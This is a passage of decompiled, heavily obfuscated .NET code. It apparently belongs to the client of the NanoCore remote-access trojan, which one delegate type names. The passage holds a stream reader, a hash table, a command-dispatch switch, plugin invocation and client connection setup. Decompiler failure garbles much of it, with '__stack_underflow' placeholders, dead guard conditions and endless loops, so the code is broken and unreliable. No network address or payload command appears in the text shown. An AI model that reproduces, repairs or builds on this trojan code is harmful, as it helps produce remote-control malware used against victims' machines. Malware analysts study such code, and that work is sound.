                arg2 = arg2 + 2;
                local6 = local0 - local5;
                if (local6 >= 0)
                {
                    while (true)
                    {
                        local4 = local4 - 1;
                        if ((local4 - 1) >= 0)
                        {
                            if (local0 < local3)
                            {
                                local0 = local0 + 1;
                                local6 = local6 + 1;
                                arg3[local0] = arg3[local6];
                                continue;
                            }
                            else
                            {
                                break;
                            }
                        }
                    }
                    continue;
                }
                return;
            }
        }
    }
}
// #=qnB6QgyVNIUL$Uq0GD3p5d7LpaFZvHrB3jSqhv3o7qlE=
internal static string #=q00kXQ$0a$SV9DIgRtf4NWQ==(int arg1)
{
    string local0;
    int local1;
    System.Reflection.Assembly local2;
    System.Reflection.Assembly local3;
    System.IO.Stream local4;
    int local5;
    System.Diagnostics.StackTrace local6;
    System.Diagnostics.StackFrame local7;
    System.Reflection.MethodBase local8;
    System.Type local9;
    bool local10;
    short local11;
    System.Reflection.AssemblyName local12;
    long local13;
    char[] local14;
    int local15;
    byte[] local16;
    short local17;
    int local18;
    int local19;
    byte[] local20;
    bool local21;
    bool local22;
    bool local23;
    byte[] local24;
    int local25;
    byte local26;
    int local27;
    byte[] local28;
    int local29;
    char[] local30;
    int local31;
    string local32;
    #=qvX$J24rI0eJ0gWfA6CEdzVJN7bQN_YTuS98N0yyMYPo= local33;
    int local34;

    System.Threading.Monitor.Enter((2 != 0 ? (local33 = #=qUZMwlqlTBPLi1iscPEnOdMZqp5jDsQ1UK2Kgux$Yn40=) : #=qUZMwlqlTBPLi1iscPEnOdMZqp5jDsQ1UK2Kgux$Yn40=));
    while (true)
    {
        if (4 != 0)
        {
            local0 = __stack_underflow;
        }
    }
    if (8 != 0)
    {
        local32 = __stack_underflow;
    }
    return local32;
}
// #=qdObzsTSX0MpvDi$OPjsFh219oh6Iw7DshgNWGveAvBQ=
public void .ctor(System.IO.Stream arg1)
{
    if (7 != 0)
    {
        __stack_underflow.#=qUUt$Zm9DEy7746wMpw0nOgKcClljRPRKWyhQ21GyaOQ= = __stack_underflow;
    }
    if (1 != 0)
    {
        __stack_underflow.#=qAsEDmMyJR5b6o5oAn_4$qhqe51JCfsU9Gffe156c8UU= = __stack_underflow;
    }
    return;
}
// #=qdObzsTSX0MpvDi$OPjsFh219oh6Iw7DshgNWGveAvBQ=
public System.IO.Stream #=q1r$Sd9Acbw6KsKv_F9uYTPvvGAfiEwUnai9OGYAUQBg=()
{
    return ((8 != 0 ? this : this)).#=qUUt$Zm9DEy7746wMpw0nOgKcClljRPRKWyhQ21GyaOQ=;
}
// #=qdObzsTSX0MpvDi$OPjsFh219oh6Iw7DshgNWGveAvBQ=
public short #=qSJAMGBE37IZjr90jS4_MYNWNa1$s8PXhOErbnAhK_ZI=()
{
    ((2 != 0 ? this : this)).#=qsR25pLrAgwps$DwdB_BuUbMipiUFFEDkypROuvRRPj4=(2);
    return (short)(((5 != 0 ? this : this)).#=qAsEDmMyJR5b6o5oAn_4$qhqe51JCfsU9Gffe156c8UU=[0] | (((5 != 0 ? this : this)).#=qAsEDmMyJR5b6o5oAn_4$qhqe51JCfsU9Gffe156c8UU=[1] << 8));
}
// #=qdObzsTSX0MpvDi$OPjsFh219oh6Iw7DshgNWGveAvBQ=
public int #=qEDU5bqS$T9T0k2xHaznuPTNI8j4z6II52ItUe0wjyZ4=()
{
    ((0 == 0 ? this : this)).#=qsR25pLrAgwps$DwdB_BuUbMipiUFFEDkypROuvRRPj4=(4);
    return ((((4 != 0 ? this : this)).#=qAsEDmMyJR5b6o5oAn_4$qhqe51JCfsU9Gffe156c8UU=[0] | (((3 != 0 ? this : this)).#=qAsEDmMyJR5b6o5oAn_4$qhqe51JCfsU9Gffe156c8UU=[1] << 8)) | (this.#=qAsEDmMyJR5b6o5oAn_4$qhqe51JCfsU9Gffe156c8UU=[2] << 16)) | (this.#=qAsEDmMyJR5b6o5oAn_4$qhqe51JCfsU9Gffe156c8UU=[3] << 24);
}
// #=qdObzsTSX0MpvDi$OPjsFh219oh6Iw7DshgNWGveAvBQ=
private void #=qJAZ7is41tIXMNDQIkGLgjRC15Eis_QBrdFx8JT2Rx54=()
{
    throw new System.IO.EndOfStreamException();
}
// #=qdObzsTSX0MpvDi$OPjsFh219oh6Iw7DshgNWGveAvBQ=
private void #=qsR25pLrAgwps$DwdB_BuUbMipiUFFEDkypROuvRRPj4=(int arg1)
{
    int local0;
    int local1;

    if (5 != 0)
    {
        local0 = __stack_underflow;
    }
    if (2 != 0)
    {
        local1 = __stack_underflow;
    }
    if (arg1 == 1)
    {
        if (1 != 0)
        {
            local1 = __stack_underflow;
        }
        if (local1 == -1)
        {
            this.#=qJAZ7is41tIXMNDQIkGLgjRC15Eis_QBrdFx8JT2Rx54=();
        }
        this.#=qAsEDmMyJR5b6o5oAn_4$qhqe51JCfsU9Gffe156c8UU=[0] = (byte)local1;
        return;
    }
    while (true)
    {
        local1 = this.#=qUUt$Zm9DEy7746wMpw0nOgKcClljRPRKWyhQ21GyaOQ=.Read(this.#=qAsEDmMyJR5b6o5oAn_4$qhqe51JCfsU9Gffe156c8UU=, local0, arg1 - local0);
        if (local1 == 0)
        {
            this.#=qJAZ7is41tIXMNDQIkGLgjRC15Eis_QBrdFx8JT2Rx54=();
        }
    }
    return;
}
// #=qdObzsTSX0MpvDi$OPjsFh219oh6Iw7DshgNWGveAvBQ=
public void #=qgHxgiBgB0FhzEGOOs2Dqnfh3XnJ7nEmajCNqRqFR3Fg=()
{
    System.IO.Stream local0;

    if (4 != 0)
    {
        local0 = __stack_underflow;
    }
    if (0 == 0)
    {
        __stack_underflow.#=qUUt$Zm9DEy7746wMpw0nOgKcClljRPRKWyhQ21GyaOQ= = __stack_underflow;
    }
    if (local0 != null)
    {
        local0.Close();
    }
    if (7 != 0)
    {
        __stack_underflow.#=qAsEDmMyJR5b6o5oAn_4$qhqe51JCfsU9Gffe156c8UU= = __stack_underflow;
    }
    return;
}
// #=qdObzsTSX0MpvDi$OPjsFh219oh6Iw7DshgNWGveAvBQ=
public byte[] #=qfsxP7vyadqL93mAkiQXr1tsUC0B$7Gp0ZNAPpjNxIG0=(int arg1)
{
    byte[] local0;
    int local1;
    int local2;
    byte[] local3;

    if (arg1 < 0)
    {
        throw new System.ArgumentOutOfRangeException();
    }
    if (-1 != 0)
    {
        local0 = __stack_underflow;
    }
    if (6 != 0)
    {
        local1 = __stack_underflow;
    }
    while (true)
    {
        if (-1 != 0)
        {
            local2 = __stack_underflow;
        }
    }
    if (local1 != ((int)local0.Length))
    {
        local3 = new System.Byte[local1];
        System.Buffer.BlockCopy(local0, 0, local3, 0, local1);
        local0 = local3;
    }
    return local0;
}
// #=qvX$J24rI0eJ0gWfA6CEdzVJN7bQN_YTuS98N0yyMYPo=
public void .ctor()
{
    if (4 != 0)
    {
        __stack_underflow.#=qzI8efPARogp2CZcGB2UtfAz2tJs0A4fM9fKvuTKYqi8= = __stack_underflow;
    }
    return;
}
// #=qvX$J24rI0eJ0gWfA6CEdzVJN7bQN_YTuS98N0yyMYPo=
public void .ctor(int arg1)
{
    int local0;

    if (6 != 0)
    {
        local0 = __stack_underflow;
    }
    if (5 != 0)
    {
        arg1 = __stack_underflow;
    }
    while (local0 < arg1)
    {
        if (local0 > 0)
        {
            if (0 == 0)
            {
                local0 = __stack_underflow;
                continue;
            }
            else
            {
                continue;
            }
        }
        if (local0 < 0)
        {
            local0 = 16;
        }
        this.#=qzI8efPARogp2CZcGB2UtfAz2tJs0A4fM9fKvuTKYqi8= = new #=q6NenfQbzQYLSZe2oYrhKsEGeaR69wF$W7VvfZPx7lyg=[local0];
        return;
    }
}
// #=qvX$J24rI0eJ0gWfA6CEdzVJN7bQN_YTuS98N0yyMYPo=
public int #=qHauijmh2nJ5kHO6fTYBnJFZKkfzkWt5gB4mYS5OLOVc=()
{
    return ((0 == 0 ? this : this)).#=qa3EpMqO3KVCTrDUnetWt6fRbeWox1uN3vfSP5v_W_wc=;
}
// #=qvX$J24rI0eJ0gWfA6CEdzVJN7bQN_YTuS98N0yyMYPo=
private void #=qpE_mRkS89WMXbQTdLD7bwp4pTt2zrWY_WBF1BLz1fes=()
{
    #=q6NenfQbzQYLSZe2oYrhKsEGeaR69wF$W7VvfZPx7lyg=[] local0;
    int local1;
    int local2;
    #=q6NenfQbzQYLSZe2oYrhKsEGeaR69wF$W7VvfZPx7lyg=[] local3;
    int local4;
    int local5;
    string local6;
    int local7;
    int local8;

    if (0 == 0)
    {
        local0 = __stack_underflow;
    }
    if (4 != 0)
    {
        local1 = __stack_underflow;
    }
    if (-1 != 0)
    {
        local2 = __stack_underflow;
    }
    if (local2 <= 0)
    {
        return;
    }
    local3 = new #=q6NenfQbzQYLSZe2oYrhKsEGeaR69wF$W7VvfZPx7lyg=[local2];
    local4 = 0;
    local5 = 0;
    while (local5 < local1)
    {
        local6 = (&local0[local5]).#=qLSPQZXlXixhGX8Gd10$ph8j0p3_XdW2xwrfqz3nO7MY=;
        if (local6 != null)
        {
            local7 = (&local0[local5]).#=qSLl9utb6ViD7fbZHSox8oSv7PZDBMO5b6MBr_gzzHF8=;
            local8 = local7 & (local2 - 1);
            while ((&local3[local8]).#=qLSPQZXlXixhGX8Gd10$ph8j0p3_XdW2xwrfqz3nO7MY= != null)
            {
                local8 = local8 + 1;
                if (local8 >= local2)
                {
                    local8 = 0;
                    continue;
                }
            }
            (&local3[local8]).#=qLSPQZXlXixhGX8Gd10$ph8j0p3_XdW2xwrfqz3nO7MY= = local6;
            (&local3[local8]).#=qSLl9utb6ViD7fbZHSox8oSv7PZDBMO5b6MBr_gzzHF8= = local7;
            local4 = local4 + 1;
            local5 = local5 + 1;
            continue;
        }
        local5 = local5 + 1;
        continue;
    }
    this.#=qzI8efPARogp2CZcGB2UtfAz2tJs0A4fM9fKvuTKYqi8= = local3;
    this.#=qa3EpMqO3KVCTrDUnetWt6fRbeWox1uN3vfSP5v_W_wc= = local4;
    return;
}
// #=qvX$J24rI0eJ0gWfA6CEdzVJN7bQN_YTuS98N0yyMYPo=
public string #=qWszclzYrfU2ikD2Jo7BLiQ==(int arg1)
{
    #=q6NenfQbzQYLSZe2oYrhKsEGeaR69wF$W7VvfZPx7lyg=[] local0;
    int local1;
    int local2;
    string local3;

    if (0 == 0)
    {
        local0 = __stack_underflow;
    }
    if (5 != 0)
    {
        local1 = __stack_underflow;
    }
    if (1 != 0)
    {
        local2 = __stack_underflow;
    }
    local3 = null;
    while ((&local0[local2]).#=qSLl9utb6ViD7fbZHSox8oSv7PZDBMO5b6MBr_gzzHF8= != arg1)
    {
        if ((&local0[local2]).#=qLSPQZXlXixhGX8Gd10$ph8j0p3_XdW2xwrfqz3nO7MY= != null)
        {
            local2 = local2 + 1;
            if (local2 >= local1)
            {
                local2 = 0;
                continue;
            }
        }
        return local3;
    }
    local3 = (&local0[local2]).#=qLSPQZXlXixhGX8Gd10$ph8j0p3_XdW2xwrfqz3nO7MY=;
    return local3;
}
// #=qvX$J24rI0eJ0gWfA6CEdzVJN7bQN_YTuS98N0yyMYPo=
public void #=qiO2giJomMFK1wa5$389nVw==(int arg1, string arg2)
{
    #=q6NenfQbzQYLSZe2oYrhKsEGeaR69wF$W7VvfZPx7lyg=[] local0;
    int local1;
    int local2;
    int local3;
    int local4;
    bool local5;

    if (-1 != 0)
    {
        local0 = __stack_underflow;
    }
    if (7 != 0)
    {
        local1 = __stack_underflow;
    }
    if (1 != 0)
    {
        local2 = __stack_underflow;
    }
    local3 = arg1 & (local1 - 1);
    while (true)
    {
        local4 = (&local0[local3]).#=qSLl9utb6ViD7fbZHSox8oSv7PZDBMO5b6MBr_gzzHF8=;
        local5 = (&local0[local3]).#=qLSPQZXlXixhGX8Gd10$ph8j0p3_XdW2xwrfqz3nO7MY= == null;
        if (!(local4 == arg1 || !(!local5)))
        {
            local3 = local3 + 1;
            if (local3 >= local1)
            {
                local3 = 0;
                continue;
            }
        }
    }
    (&local0[local3]).#=qLSPQZXlXixhGX8Gd10$ph8j0p3_XdW2xwrfqz3nO7MY= = arg2;
    if (!(!local5))
    {
        (&local0[local3]).#=qSLl9utb6ViD7fbZHSox8oSv7PZDBMO5b6MBr_gzzHF8= = arg1;
        this.#=qa3EpMqO3KVCTrDUnetWt6fRbeWox1uN3vfSP5v_W_wc= = this.#=qa3EpMqO3KVCTrDUnetWt6fRbeWox1uN3vfSP5v_W_wc= + 1;
        if (this.#=qa3EpMqO3KVCTrDUnetWt6fRbeWox1uN3vfSP5v_W_wc= > local2)
        {
            this.#=qpE_mRkS89WMXbQTdLD7bwp4pTt2zrWY_WBF1BLz1fes=();
        }
    }
    return;
}
// #=qo5Pv9nXCIU9X_B8SJDUR_qgp7npNK2pA1rGP0GNQ51o=
public static void #=qYVgYkiAmhdTmisXUMVHYlJUHzcBdggj3Sn3nLI_MDJ4=(#=qxe_BfLLMHqYa_KBeLsRfpw== arg1)
{
    switch ((&arg1).#=qKi0KrAcAGUOMcS5S$2tJyg== - 1)
    {
        case 0:
            #=q_UogavoS8ANyZp2cF0B9t7qG1b3QUqGTYeTlmQIKxqY=();
            break;
        case 1:
            #=qK7tJUw5nsLE_rt2JHgqYI6_vH0s$mFFB1QifRuMCr34=((&arg1).#=qL_Q_RdUm_wJ7VeVwUqRXbA==);
            break;
        case 2:
            break;
        case 3:
            #=qFZLDtLWdUONY4B_gU_jjJi4BgFANcRLPMuWuQINdRLc=((&arg1).#=q9heLrZy3cpWSk7do8VVthg==, (&arg1).#=qL_Q_RdUm_wJ7VeVwUqRXbA==);
            break;
        case 4:
            break;
        case 5:
            #=qhwyNa_lhtuoyuJK5j3BcF4xu5fY5XhFlgzkM1Cgy6IA=();
            break;
        case 6:
            #=qYiXVlu3YVR5erIxfIIBHo1Gv4y4z4vrtnS$$9CALbVE=((&arg1).#=qL_Q_RdUm_wJ7VeVwUqRXbA==);
            break;
        default:
            break;
    }
    return;
}
// #=qo5Pv9nXCIU9X_B8SJDUR_qgp7npNK2pA1rGP0GNQ51o=
public static void #=q_UogavoS8ANyZp2cF0B9t7qG1b3QUqGTYeTlmQIKxqY=()
{
    #=qWcYPgOJASLG6mRBDPhOIZERKO3Eig2IiEWCrUa$w_Mw=(true);
    return;
}
// #=qo5Pv9nXCIU9X_B8SJDUR_qgp7npNK2pA1rGP0GNQ51o=
public static void #=qFZLDtLWdUONY4B_gU_jjJi4BgFANcRLPMuWuQINdRLc=(System.Guid arg1, object[] arg2)
{
    #=qbbSw65PC$nto6DJiWxTawg== local0;
    System.Exception local1;

    if (0 == 0)
    {
        local0 = __stack_underflow;
    }
    if (local0 == null)
    {
        throw new System.Exception(System.String.Format(#=q00kXQ$0a$SV9DIgRtf4NWQ==(516958754), arg1));
    }
    try
    {
        local0.#=qecBuZmXKFD$jZa5T0d0L1w==.#=qBk9t7p9S5R095rOkFdE8GQ==(null, arg2);
        return;
    }
    catch (System.Exception ex)
    {
    }
}
// #=qo5Pv9nXCIU9X_B8SJDUR_qgp7npNK2pA1rGP0GNQ51o=
public static void #=qK7tJUw5nsLE_rt2JHgqYI6_vH0s$mFFB1QifRuMCr34=(object[] arg1)
{
    Client local0;
    #=qbOmsEb0zGpdZukI0D4Idug== local1;
    string local2;
    System.Guid local3;
    System.Guid local4;

    if (2 != 0)
    {
        local2 = __stack_underflow;
    }
    if (0 == 0)
    {
        local4 = __stack_underflow;
    }
    if (6 != 0)
    {
        local3 = __stack_underflow;
    }
    if (!(!#=qalo3zYdlWWh$dYSx9JnNrw==.ContainsKey(local2)))
    {
        return;
    }
    local0 = #=qd3Itd1ELDPHJxhLvt0y1NQ==();
    #=qalo3zYdlWWh$dYSx9JnNrw==.Add(local2, local0);
    local1 = null;
    if (local3 != Empty)
    {
        local1 = #=qSl7F7iXGTH9iNXHds05fxcgA7Cydd52A6vZtHH_41F4=(local3).#=qecBuZmXKFD$jZa5T0d0L1w==;
    }
    local0.#=qtIl3MhjXHsnCHvTVFi9hFg==(new #=q4KMIX0AcXAdYuUiSKvyy9Q==());
    local0.#=qOWs9MBREWujnaIdYgAI1lg==().#=qI5Vms5JVXaVkwalJFV3L6w==(local4, local2, local1);
    local0.#=qDTvHA26pSwiGBDknUzewBVNt3YGW7YeSiQRH8F$_CMA=(#=qyMcWoZuG7jRWeztMnp6fPmxxmqfVgP7DLzGs7HeF4Mo=);
    local0.#=qQoUfP$jAQrKMjDuqm54QmA==(#=qJdNCQZ8JQCfthL12ut8Zgnr9$rl3CuJQ4GAn54E6CXs=);
    local0.#=qEQtWieYw8BPdEE4hbsjTLrq$BwGjJOBoaDYJmV9xVgE=(#=qZuX180bPJwK7MhIsqenk34Le3ZCQFFLgmBb4sMlYIpg=);
    local0.#=qs77tphQ2NXlLwCZkimhHsowpXGqSYmOGtKiGHHIs4aA=(#=qudwGeEjJDUB9pt$_k0YOgc30ZWMo1bIGmdknk40OWog=);
    local0.#=qw39MYiiaN1XJbqsDq$LgQw==(#=qGCYL9FviWCrv0prWZC8VfgL34V_6XyB$buFX2LkjbCg=(), #=qxJg7RxTW1v5mnt12xXeJiYJv_bcctbtL2BCD5MjDi45Hlz6t8vwDNTv1Rv7tgIct());
    return;
}
// #=qo5Pv9nXCIU9X_B8SJDUR_qgp7npNK2pA1rGP0GNQ51o=
public static void #=qhwyNa_lhtuoyuJK5j3BcF4xu5fY5XhFlgzkM1Cgy6IA=()
{
    if (6 != 0)
    {
        #=qi_z83UuaQZa6UsXCAahbTQ== = __stack_underflow;
    }
    return;
}
// #=qo5Pv9nXCIU9X_B8SJDUR_qgp7npNK2pA1rGP0GNQ51o=
public static void #=qYiXVlu3YVR5erIxfIIBHo1Gv4y4z4vrtnS$$9CALbVE=(object[] arg1)
{
    bool local0;
    string local1;
    string local2;
    System.Exception local3;

    if (1 != 0)
    {
        local1 = __stack_underflow;
    }
    if (-1 != 0)
    {
        local0 = __stack_underflow;
    }
    if (!(!local0))
    {
        try
        {
            if (2 != 0)
            {
                local2 = __stack_underflow;
            }
        }
        catch (System.Exception ex)
        {
        }
    }
    if (#=q79YE7jk$t8I7uIUVykHcVA==.Count != 0)
    {
        #=qpQiSeXaCc6qGNX49vDbcMYyzv_UpV$YoUyrH0l6FW6Q=(#=q79YE7jk$t8I7uIUVykHcVA==.Dequeue());
    }
    return;
}
// #=qo5Pv9nXCIU9X_B8SJDUR_qgp7npNK2pA1rGP0GNQ51o=
public static void #=quO7UmvJ4RBuIIChSn0jx_M$HL4rBuRuRZnNBEMlpsJw=(System.Guid arg1, string arg2, string arg3, System.Version arg4)
{
    object[] local0;

    if (8 != 0)
    {
        local0 = __stack_underflow;
    }
    local0[0] = arg1;
    local0[1] = arg2;
    local0[2] = arg3;
    local0[3] = arg4.ToString();
    #=qkxzumuLbzy2O2XsBlM3j$g==(__stack_underflow, __stack_underflow, __stack_underflow, __stack_underflow, local0);
    return;
}
// #=qo5Pv9nXCIU9X_B8SJDUR_qgp7npNK2pA1rGP0GNQ51o=
public static void #=qpQiSeXaCc6qGNX49vDbcMYyzv_UpV$YoUyrH0l6FW6Q=(string arg1)
{
    object[] local0;

    if (-1 != 0)
    {
        local0 = __stack_underflow;
    }
    local0[0] = arg1;
    #=qkxzumuLbzy2O2XsBlM3j$g==(__stack_underflow, __stack_underflow, __stack_underflow, __stack_underflow, local0);
    return;
}
// #=qo5Pv9nXCIU9X_B8SJDUR_qgp7npNK2pA1rGP0GNQ51o=
public static void #=qP42Tluk0y5t5VrN_nwVhnaX9baaRq2NaLaW6RMHNX_k=(string arg1)
{
    object[] local0;

    if (8 != 0)
    {
        local0 = __stack_underflow;
    }
    local0[0] = arg1;
    #=qkxzumuLbzy2O2XsBlM3j$g==(__stack_underflow, __stack_underflow, __stack_underflow, __stack_underflow, local0);
    return;
}
// #=qo5Pv9nXCIU9X_B8SJDUR_qgp7npNK2pA1rGP0GNQ51o=
public static void #=q5WXECfTJPQIQ2JoJDGsf9pTFKCPzQGp3$QlyT_g_ZCY=()
{
    #=qkxzumuLbzy2O2XsBlM3j$g==(#=q6Xi08r0$lOOnXtoBHhfMuQ==, true, (CommandType)0, 6, new System.Object[0]);
    return;
}
// #=qq2h0VNJ4eWuHP5LphH0mpA==
private static void .cctor()
{
    string[] local0;

    if (-1 != 0)
    {
        local0 = __stack_underflow;
    }
    local0[0] = #=q00kXQ$0a$SV9DIgRtf4NWQ==(516958640);
    local0[1] = #=q00kXQ$0a$SV9DIgRtf4NWQ==(516958651);
    local0[2] = #=q00kXQ$0a$SV9DIgRtf4NWQ==(516958629);
    local0[3] = #=q00kXQ$0a$SV9DIgRtf4NWQ==(516958639);
    local0[4] = #=q00kXQ$0a$SV9DIgRtf4NWQ==(516958550);
    local0[5] = #=q00kXQ$0a$SV9DIgRtf4NWQ==(516958528);
    if (1 != 0)
    {
        #=qUWYBucdXrqr2Ksc_3qKZcA== = __stack_underflow;
    }
    if (8 != 0)
    {
        local0 = __stack_underflow;
    }
    local0[0] = #=q00kXQ$0a$SV9DIgRtf4NWQ==(516958541);
    local0[1] = #=q00kXQ$0a$SV9DIgRtf4NWQ==(516958589);
    local0[2] = #=q00kXQ$0a$SV9DIgRtf4NWQ==(516958571);
    local0[3] = #=q00kXQ$0a$SV9DIgRtf4NWQ==(516958489);
    local0[4] = #=q00kXQ$0a$SV9DIgRtf4NWQ==(516958489);
    local0[5] = #=q00kXQ$0a$SV9DIgRtf4NWQ==(516958471);
    if (6 != 0)
    {
        #=q7wyeNFqtiGUhQt6sicod9g== = __stack_underflow;
    }
    if (1 != 0)
    {
        local0 = __stack_underflow;
    }
    local0[0] = #=q00kXQ$0a$SV9DIgRtf4NWQ==(516958512);
    local0[1] = #=q00kXQ$0a$SV9DIgRtf4NWQ==(516958525);
    local0[2] = #=q00kXQ$0a$SV9DIgRtf4NWQ==(516958502);
    local0[3] = #=q00kXQ$0a$SV9DIgRtf4NWQ==(516958928);
    local0[4] = #=q00kXQ$0a$SV9DIgRtf4NWQ==(516958938);
    local0[5] = #=q00kXQ$0a$SV9DIgRtf4NWQ==(516958919);
    local0[6] = #=q00kXQ$0a$SV9DIgRtf4NWQ==(516958961);
    local0[7] = #=q00kXQ$0a$SV9DIgRtf4NWQ==(516958970);
    local0[8] = #=q00kXQ$0a$SV9DIgRtf4NWQ==(516958948);
    local0[9] = #=q00kXQ$0a$SV9DIgRtf4NWQ==(516958958);
    local0[10] = #=q00kXQ$0a$SV9DIgRtf4NWQ==(516958872);
    local0[11] = #=q00kXQ$0a$SV9DIgRtf4NWQ==(516958853);
    local0[12] = #=q00kXQ$0a$SV9DIgRtf4NWQ==(516958863);
    local0[13] = #=q00kXQ$0a$SV9DIgRtf4NWQ==(516958905);
    local0[14] = #=q00kXQ$0a$SV9DIgRtf4NWQ==(516958883);
    local0[15] = #=q00kXQ$0a$SV9DIgRtf4NWQ==(516958892);
    local0[16] = #=q00kXQ$0a$SV9DIgRtf4NWQ==(516958806);
    local0[17] = #=q00kXQ$0a$SV9DIgRtf4NWQ==(516958787);
    local0[18] = #=q00kXQ$0a$SV9DIgRtf4NWQ==(516958797);
    local0[19] = #=q00kXQ$0a$SV9DIgRtf4NWQ==(516958839);
    local0[20] = #=q00kXQ$0a$SV9DIgRtf4NWQ==(516958817);
    local0[21] = #=q00kXQ$0a$SV9DIgRtf4NWQ==(516958827);
    local0[22] = #=q00kXQ$0a$SV9DIgRtf4NWQ==(516958741);
    #=q66hvvPDVbMv$MYStXtnb6Q== = local0;
    return;
}
// #=qq2h0VNJ4eWuHP5LphH0mpA==
public static #=qq2h0VNJ4eWuHP5LphH0mpA== #=qLKYxZZVHP8wT4ocBxnjPXg==(System.Guid arg1)
{
    string local1;
    string local2;
    string local3;
    System.Random local4;
    int local5;
    #=qq2h0VNJ4eWuHP5LphH0mpA== local6;

    if (4 != 0)
    {
        local4 = __stack_underflow;
    }
    if (7 != 0)
    {
        local5 = __stack_underflow;
    }
    if (7 != 0)
    {
        local3 = __stack_underflow;
    }
    local1 = #=q7wyeNFqtiGUhQt6sicod9g==[local5];
    local2 = Empty;
    while (true)
    {
        local2 = #=q66hvvPDVbMv$MYStXtnb6Q==[local4.Next(checked((int)#=q66hvvPDVbMv$MYStXtnb6Q==.Length))];
        if (local2[local2.Length - 1] == local3[0])
        {
            continue;
        }
    }
    local6 = default(#=qq2h0VNJ4eWuHP5LphH0mpA==);
    (&local6).#=qAR9aFFQPEovpFzvfokoGkw== = System.String.Format(#=q00kXQ$0a$SV9DIgRtf4NWQ==(516958349), local2.ToUpper(), local1);
    (&local6).#=qPjPHWXGbaA$51Cna2ZaMpQ== = System.String.Format(#=q00kXQ$0a$SV9DIgRtf4NWQ==(516958751), local2, local3);
    return local6;
}
// #=qq2h0VNJ4eWuHP5LphH0mpA==
private static int #=qWfwpJtKOXBFXf_1zpmLUrQ==(System.Guid arg1)
{
    byte[] local0;
    int local1;
    int local3;
    int local4;

    if (4 != 0)
    {
        local0 = __stack_underflow;
    }
    if (4 != 0)
    {
        local1 = __stack_underflow;
    }
    if (6 != 0)
    {
        local4 = __stack_underflow;
    }
    local3 = __stack_underflow;
    while (local3 <= local4)
    {
        local1 = local1 ^ local0[local3];
        local3 = local3 + 1;
        continue;
    }
    return local1;
}
// #=qQkx1bBZns8hPde7$PcvfUl2fAairj6t_H8ve7nJO2s3BIB3t7PXd4ZR9h0JHyxrX
public void .ctor(System.Collections.Generic.Dictionary<string, object> arg1)
{
    if (6 != 0)
    {
        __stack_underflow.#=qhv_9OQaSyr5PWElvgkBxFw== = __stack_underflow;
    }
    return;
}
// #=qQkx1bBZns8hPde7$PcvfUl2fAairj6t_H8ve7nJO2s3BIB3t7PXd4ZR9h0JHyxrX
public object GetValue(string arg1, object arg2)
{
    object local0;
    System.Collections.Generic.Dictionary<string, object> local1;

    if (-1 != 0)
    {
        local1 = __stack_underflow;
    }
    System.Threading.Monitor.Enter(local1);
    try
    {
        if (!this.#=qhv_9OQaSyr5PWElvgkBxFw==.ContainsKey(arg1))
        {
            if (5 != 0)
            {
                local0 = __stack_underflow;
            }
        }
        else
        {
            if (3 != 0)
            {
                local0 = __stack_underflow;
            }
        }
    }
    finally
    {
    }
    return local0;
}
// #=qQkx1bBZns8hPde7$PcvfUl2fAairj6t_H8ve7nJO2s3BIB3t7PXd4ZR9h0JHyxrX
public void #=q1ZcUbkVKv7wahbk_Am8y6A==(string arg1, object arg2)
{
    System.Collections.Generic.Dictionary<string, object> local0;

    if (-1 != 0)
    {
        local0 = __stack_underflow;
    }
    System.Threading.Monitor.Enter(local0);
    try
    {
        if (!this.#=qhv_9OQaSyr5PWElvgkBxFw==.ContainsKey(arg1))
        {
            this.#=qhv_9OQaSyr5PWElvgkBxFw==.Add(arg1, System.Runtime.CompilerServices.RuntimeHelpers.GetObjectValue(arg2));
        }
        else
        {
            if (!this.#=qhv_9OQaSyr5PWElvgkBxFw==[arg1].Equals(System.Runtime.CompilerServices.RuntimeHelpers.GetObjectValue(arg2)))
            {
                this.#=qhv_9OQaSyr5PWElvgkBxFw==[arg1] = System.Runtime.CompilerServices.RuntimeHelpers.GetObjectValue(arg2);
            }
        }
    }
    finally
    {
    }
    return;
}
// #=qQkx1bBZns8hPde7$PcvfUl2fAairj6t_H8ve7nJO2s3BIB3t7PXd4ZR9h0JHyxrX
public bool EntryExists(string arg1)
{
    bool local0;
    System.Collections.Generic.Dictionary<string, object> local1;

    if (0 == 0)
    {
        local1 = __stack_underflow;
    }
    System.Threading.Monitor.Enter(local1);
    try
    {
        if (8 != 0)
        {
            local0 = __stack_underflow;
        }
    }
    finally
    {
    }
    return local0;
}
// #=qQkx1bBZns8hPde7$PcvfUl2fAairj6t_H8ve7nJO2s3BIB3t7PXd4ZR9h0JHyxrX
public System.Collections.Generic.KeyValuePair<string, object>[] GetEntries()
{
    System.Collections.Generic.KeyValuePair<string, object>[] local0;
    System.Collections.Generic.Dictionary<string, object>.Enumerator local1;
    System.Collections.Generic.List<System.Collections.Generic.KeyValuePair<string, object>> local2;
    System.Collections.Generic.Dictionary<string, object> local3;
    System.Collections.Generic.KeyValuePair<string, object> local4;
    System.Collections.Generic.KeyValuePair<string, object> local5;
    System.Collections.Generic.KeyValuePair<string, object> local6;

    if (3 != 0)
    {
        local3 = __stack_underflow;
    }
    System.Threading.Monitor.Enter(local3);
    try
    {
        if (5 != 0)
        {
            local2 = __stack_underflow;
        }
    }
    finally
    {
    }
    return local0;
}
// #=qtussAh$DpHFmu7sm9TXJyZsrjeJ6Xm9c2y22v4wQG2s=
public void .ctor()
{
    ((7 != 0 ? this : this)).ctor();
    return;
}
// #=qtWaDSiZ3KDHpQtSfxDZV0w==
public void .ctor(#=qbOmsEb0zGpdZukI0D4Idug== arg1)
{
    if (-1 != 0)
    {
        __stack_underflow.#=q44BQlEuOnjFd0LbnzKKIIg== = __stack_underflow;
    }
    return;
}
// #=qtWaDSiZ3KDHpQtSfxDZV0w==
public void Invoke(NanoCore.ClientInvokeDelegate arg1, object arg2)
{
    object[] local0;

    if (arg1 == null)
    {
        #=qhg8oaKg1xx$HC$DKnlbXQpibwH2HXqMGSlGv30vEUsU=(this.#=q44BQlEuOnjFd0LbnzKKIIg==, new System.Exception(#=q00kXQ$0a$SV9DIgRtf4NWQ==(516959374)), #=q00kXQ$0a$SV9DIgRtf4NWQ==(516959304));
        return;
    }
    if (!#=qk77uxMCXAcR_2KMKgZiSng==.InvokeRequired)
    {
        arg1.Invoke(System.Runtime.CompilerServices.RuntimeHelpers.GetObjectValue(arg2));
    }
    else
    {
        if (5 != 0)
        {
            local0 = __stack_underflow;
        }
        local0[0] = System.Runtime.CompilerServices.RuntimeHelpers.GetObjectValue(arg2);
        __stack_underflow.Invoke(__stack_underflow, local0);
    }
    return;
}
// #=qVxXNKnhAcArgJoGGYXiyyQ==
public void .ctor()
{
